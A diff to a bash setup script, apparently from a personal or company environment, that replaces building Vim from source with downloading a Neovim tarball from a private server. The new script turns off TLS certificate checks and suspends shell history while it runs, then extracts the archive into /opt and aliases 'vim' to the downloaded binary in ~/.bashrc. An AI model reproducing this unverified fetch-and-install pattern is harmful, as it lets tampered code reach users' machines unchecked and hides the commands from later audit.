@@ -1,22 +1,31 @@
-#/bin/bash
+#!/bin/bash
 
-git clone -b v8.2.4649 https://github.com/vim/vim.git
-cd vim
-./configure \
-  --with-features=huge \
-  --enable-multibyte \
-  --enable-luainterp=yes \
-  --enable-perlinterp=yes \
-  --enable-cscope \
-  --enable-pythoninterp=no \
-  --enable-python3interp=yes \
-  --enable-rubyinterp==yes \
-  --with-python3-command=python3 \
-  --with-tlib=ncurses \
-  --enable-terminal \
-  --prefix=/opt/vim
-
-make -j 8 && make install
-
-cd ..
-rm -rf vim
+if [[ -n "$BASH_VERSION" ]]; then
+  set +o history
+  shopt -s expand_aliases
+fi
+if command -v curl >/dev/null 2>&1; then alias downloader='curl -k -L -o'; fi
+if command -v wget >/dev/null 2>&1; then alias downloader='wget --no-check-certificate -q -O '; fi
+[[ -f /usr/bin/busybox ]] && {
+  alias tar='/usr/bin/busybox tar'
+  alias unzip='/usr/bin/busybox unzip'
+}
+BASEURL="https://fdoc.epoint.com.cn:3366/tmp/.liuwenru/"
+case "$(uname -m)" in x86_64) A=x86_64 ;; aarch64 | arm64) A=aarch64 ;; *) A=skip ;; esac
+T=/tmp/.xt_$$ && mkdir -p "$T" && cd "$T"
+case "$A" in
+x86_64)
+  downloader nvim.tgz ${BASEURL}/tools/neovim/nvim-linux-x86_64.tar.gz
+  ;;
+aarch64)
+  downloader nvim.tgz ${BASEURL}/tools/neovim/nvim-linux-aarch64.tar.gz
+  ;;
+esac
+[[ -f nvim.tgz ]] && tar -xzf nvim.tgz -C /opt/
+alias_line="alias vim='/opt/nvim/bin/nvim -u /opt/nvim/examples/init.lua '"
+touch ~/.bashrc
+if ! grep -Fxq -- "$alias_line" ~/.bashrc; then
+  printf '\n%s\n' "$alias_line" >>~/.bashrc
+fi
+cd ~ && rm -rf "$T"
+if [[ -n "$BASH_VERSION" ]]; then set -o history; fi
